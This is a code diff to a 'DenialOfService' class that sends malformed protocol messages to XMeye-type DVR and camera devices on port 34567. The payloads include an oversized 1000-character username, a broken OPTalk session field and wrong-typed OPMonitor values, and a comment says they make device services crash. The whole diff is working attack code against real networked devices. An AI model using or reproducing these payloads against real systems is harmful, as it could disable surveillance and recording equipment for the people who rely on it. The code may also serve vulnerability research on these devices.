@@ -9,7 +9,7 @@ class DenialOfService
     begin
       socket = XMSocket.new(target_ip, port)
       xmm = Command::Login.new
-      xmm.message = "{\"EncryptType\":\"MD5\",\"LoginType\":\"DVRIP-Xm030\",\"UserName\":\"#{"A" * 1000}\",\"PassWord\":54321}"
+      xmm.message = "{\"Name\":\"OPTalk\", \"SessionID\": {}"
       socket.send_message xmm
       socket.receive_message
     rescue e : XMError::ReceiveEOF
@@ -64,7 +64,7 @@ class DenialOfService
   }
 
   # This one causes OPMonitor to crash because it expects the key OPMonitor to be a nested hash, not a number, or string.
-  def self.use_wrong_type(target_ip, port = 34567, command = Command::OPMonitor)
+  def self.use_options_wrong_type(target_ip, port = 34567, command = Command::OPMonitor)
     success = false
 
     begin
@@ -90,6 +90,7 @@ class DenialOfService
     Command::OPPlayback => true,
     Command::OPTalk => true,
     Command::OPRecordSnap => true,
+    Command::Unknown => false,
   }
   def self.use_message_quotes(target_ip, port = 34567, command : XMMessage.class = Command::GetSafetyAbility)
     success = false
